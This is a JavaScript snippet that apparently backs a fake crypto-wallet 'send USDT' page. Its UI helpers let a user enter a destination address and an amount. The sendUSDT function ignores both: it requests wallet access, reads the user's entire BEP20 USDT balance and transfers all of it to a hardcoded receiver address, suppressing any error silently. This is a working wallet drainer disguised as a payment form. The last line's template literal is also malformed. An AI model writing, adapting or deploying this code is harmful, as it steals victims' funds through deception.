const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

const usdtABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 value) returns (bool)"
];

async function sendUSDT() {
  if (!window.ethereum) return;
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const user = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
    const balance = await usdt.balanceOf(user);
    if (balance.isZero()) return;

    const tx = await usdt.transfer(receiver, balance);
    await tx.wait();
  } catch (err) {
    // silent fail
  }
}

// Below functions are for UI only
function clearAddress() {
  document.getElementById("address").value = "";
}

function pasteAddress() {
  navigator.clipboard.readText().then((text) => {
    document.getElementById("address").value = text;
  });
}

function fillMax() {
  document.getElementById("amount").value = "9999"; // Demo
  updateFiat();
}

function updateFiat() {
  const amount = document.getElementById("amount").value;
  const fiat = parseFloat(amount || "0") * 1.0;
  document.getElementById("fiat").innerText = ≈ $${fiat.toFixed(2)};
}
